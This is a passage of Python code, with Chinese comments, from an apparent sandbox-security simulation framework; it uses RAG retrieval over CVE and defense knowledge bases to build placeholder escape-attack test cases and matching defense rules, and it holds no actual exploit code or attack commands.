        方向1：基于 RAG 的红方攻击用例生成

        从 CVE 知识库和逃逸技术知识库检索相关漏洞，
        基于真实 PoC 变异生成攻击用例，而不是凭空生成。

        Args:
            target_sandbox_type: 目标沙盒类型（container/vm/seccomp/ebpf）
            use_cve_kb: 是否使用 CVE 知识库
            use_evasion_kb: 是否使用逃逸技术知识库

        Returns:
            生成的攻击用例及 RAG 上下文
        """
        if not hasattr(self, '_rag_engine') or self._rag_engine is None:
            return self._fallback_attack_generation(target_sandbox_type)

        kb_names = self._select_attack_kbs(use_cve_kb, use_evasion_kb)
        if not kb_names:
            return self._fallback_attack_generation(target_sandbox_type)

        # 检索相关 CVE 和逃逸技术
        query = f"{target_sandbox_type} escape vulnerability exploit"
        rag_context = self._rag_engine.retrieve(query, kb_names=kb_names, top_k=5)

        # 提取相关 CVE 并生成攻击用例
        relevant_cves = self._extract_relevant_cves(rag_context)
        attack_case, base_cve = self._generate_attack_from_base_cve(
            relevant_cves, target_sandbox_type
        )

        # 记录统计
        self._rag_attack_cases_count = getattr(self, '_rag_attack_cases_count', 0) + 1

        return self._build_attack_result(attack_case, rag_context, relevant_cves, base_cve)

    def _select_attack_kbs(self, use_cve_kb: bool, use_evasion_kb: bool) -> List[str]:
        """选择要检索的知识库（CVE/逃逸技术）"""
        kb_names = []
        if use_cve_kb:
            kb_names.append("cve_knowledge")
        if use_evasion_kb:
            kb_names.append("attack_pattern_knowledge")
        return kb_names

    def _extract_relevant_cves(self, rag_context) -> List[Dict[str, Any]]:
        """从 RAG 检索结果提取相关 CVE（仅 CVE 知识库来源）"""
        relevant_cves = []
        for result in rag_context.results:
            if result.source_kb == "cve_knowledge":
                relevant_cves.append({
                    "cve_id": result.metadata.get("cve_id", result.doc_id),
                    "cvss": result.metadata.get("cvss", 0),
                    "type": result.metadata.get("type", "unknown"),
                    "content": result.content[:200],
                    "score": result.score,
                })
        return relevant_cves

    def _generate_attack_from_base_cve(self, relevant_cves: List[Dict],
                                        target_sandbox_type: str) -> tuple:
        """基于最高相关性 CVE 变异生成攻击用例"""
        if relevant_cves:
            base_cve = max(relevant_cves, key=lambda x: x["score"])
            attack_case = AttackCase(
                case_id=f"rag_attack_{int(time.time())}",
                attack_type=AttackType.PRIVILEGE_ESCALATION,
                description=f"基于 {base_cve['cve_id']} 的变异攻击：{base_cve['content'][:100]}",
                payload=f"RAG generated exploit based on {base_cve['cve_id']}",
                target_component=target_sandbox_type,
                difficulty=0.8 if base_cve["cvss"] >= 7.0 else 0.5,
            )
            return attack_case, base_cve
        attack_case = self._fallback_attack_generation(target_sandbox_type)["attack_case"]
        return attack_case, None

    def _build_attack_result(self, attack_case, rag_context,
                              relevant_cves: List[Dict], base_cve: Optional[Dict]) -> Dict[str, Any]:
        """构建攻击用例生成结果"""
        return {
            "attack_case": attack_case,
            "rag_context": rag_context.to_dict(),
            "relevant_cves": relevant_cves,
            "base_cve": base_cve,
            "generation_method": "rag_enhanced" if relevant_cves else "fallback",
        }

    def generate_defense_rule_with_rag(self, attack_event: Optional[Dict] = None,
                                         use_defense_kb: bool = True,
                                         use_best_practice: bool = True) -> Dict[str, Any]:
        """
        方向2：基于 RAG 的蓝方防御规则生成

        从防御规则知识库和安全最佳实践检索相关规则，
        基于已有规则变异生成新防御规则。

        Args:
            attack_event: 攻击事件（用于针对性生成防御规则）
            use_defense_kb: 是否使用防御规则知识库
            use_best_practice: 是否使用安全最佳实践

        Returns:
            生成的防御规则及 RAG 上下文
        """
        if not hasattr(self, '_rag_engine') or self._rag_engine is None:
            return self._fallback_defense_generation(attack_event)

        query = self._build_defense_query(attack_event)
        kb_names = self._select_defense_kbs(use_defense_kb, use_best_practice)
        if not kb_names:
            return self._fallback_defense_generation(attack_event)

        # 检索相关防御规则
        rag_context = self._rag_engine.retrieve(query, kb_names=kb_names, top_k=5)

        # 提取相关规则并生成防御规则
        relevant_rules = self._extract_relevant_rules(rag_context)
        defense_rule, base_rule = self._generate_defense_from_base(relevant_rules, attack_event)

        # 记录统计
        self._rag_defense_rules_count = getattr(self, '_rag_defense_rules_count', 0) + 1

        return self._build_defense_result(defense_rule, rag_context, relevant_rules, base_rule)

    def _build_defense_query(self, attack_event: Optional[Dict]) -> str:
        """构建防御规则检索 query"""
        if attack_event:
            return f"defense against {attack_event.get('attack_type', 'attack')} {attack_event.get('description', '')}"
        return "sandbox security defense rule best practice"

    def _select_defense_kbs(self, use_defense_kb: bool, use_best_practice: bool) -> List[str]:
        """选择要检索的知识库"""
        kb_names = []
        if use_defense_kb:
            kb_names.append("defense_knowledge")
        if use_best_practice:
            kb_names.append("policy_knowledge")
        return kb_names

    def _extract_relevant_rules(self, rag_context) -> List[Dict[str, Any]]:
        """从 RAG 检索结果提取相关规则"""
        relevant_rules = []
        for result in rag_context.results:
            relevant_rules.append({
                "rule_id": result.doc_id,
                "rule_type": result.metadata.get("rule_type", "general"),
                "severity": result.metadata.get("severity", "medium"),
                "content": result.content[:200],
                "score": result.score,
                "source": result.source_kb,
            })
        return relevant_rules

    def _generate_defense_from_base(self, relevant_rules: List[Dict],
                                     attack_event: Optional[Dict]) -> tuple:
        """基于最高相关性规则变异生成防御规则"""
        if relevant_rules:
            base_rule = max(relevant_rules, key=lambda x: x["score"])
            defense_rule = DefenseRule(
                rule_id=f"rag_evolved_{int(time.time())}",
                defense_type=DefenseType.SYSTEM_CALL_MONITOR,
                description=f"基于 {base_rule['rule_id']} 变异的防御规则：{base_rule['content'][:100]}",
                target_attack_types=[AttackType.NAMESPACE_ESCAPE],
                detection_logic=f"RAG generated detection based on {base_rule['rule_id']}",
                effectiveness=0.7,
            )
            return defense_rule, base_rule
        defense_rule = self._fallback_defense_generation(attack_event)["defense_rule"]
        return defense_rule, None

    def _build_defense_result(self, defense_rule, rag_context,
                               relevant_rules: List[Dict], base_rule: Optional[Dict]) -> Dict[str, Any]:
        """构建防御规则生成结果"""
        return {
            "defense_rule": defense_rule,
            "rag_context": rag_context.to_dict(),
            "relevant_rules": relevant_rules,
            "base_rule": base_rule,
            "generation_method": "rag_enhanced" if relevant_rules else "fallback",
        }

    def get_rag_stats(self) -> Dict[str, Any]:
        """获取 RAG 增强统计"""
        return {
            "rag_attack_cases_generated": getattr(self, '_rag_attack_cases_count', 0),
            "rag_defense_rules_generated": getattr(self, '_rag_defense_rules_count', 0),
            "rag_engine_configured": hasattr(self, '_rag_engine') and self._rag_engine is not None,
        }

    def _fallback_attack_generation(self, target_sandbox_type: str) -> Dict[str, Any]:
        """回退：传统攻击用例生成（无 RAG）"""
        attack_case = AttackCase(
            case_id=f"fallback_attack_{int(time.time())}",
            attack_type=AttackType.NAMESPACE_ESCAPE,
            description=f"传统生成的{target_sandbox_type}逃逸攻击用例",
            payload=f"Fallback exploit for {target_sandbox_type}",
            target_component=target_sandbox_type,
            difficulty=0.5,
        )
        return {
            "attack_case": attack_case,
            "rag_context": None,
            "relevant_cves": [],
            "base_cve": None,
            "generation_method": "fallback_no_rag",
        }

    def _fallback_defense_generation(self, attack_event: Optional[Dict]) -> Dict[str, Any]:
        """回退：传统防御规则生成（无 RAG）"""
        defense_rule = DefenseRule(
            rule_id=f"fallback_{int(time.time())}",
            defense_type=DefenseType.SYSTEM_CALL_MONITOR,
            description="传统生成的通用防御规则",
            target_attack_types=[],
            detection_logic="Fallback detection logic",
            effectiveness=0.5,
        )
        return {
            "defense_rule": defense_rule,
            "rag_context": None,
            "relevant_rules": [],
            "base_rule": None,
            "generation_method": "fallback_no_rag",
        }
